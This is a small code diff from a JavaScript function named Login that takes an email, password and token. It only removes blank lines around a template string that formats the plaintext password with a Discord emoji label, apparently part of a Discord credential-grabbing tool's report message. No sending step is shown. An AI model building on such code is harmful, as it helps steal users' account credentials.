@@ -158,11 +158,6 @@ function Login(email, password, token) {
                             
                             
                             
-                            
-                       
-
-                       
-                            
                              <:staff_blue:936543701294010399> **Password:** \`${password}\``,       
                             
                             
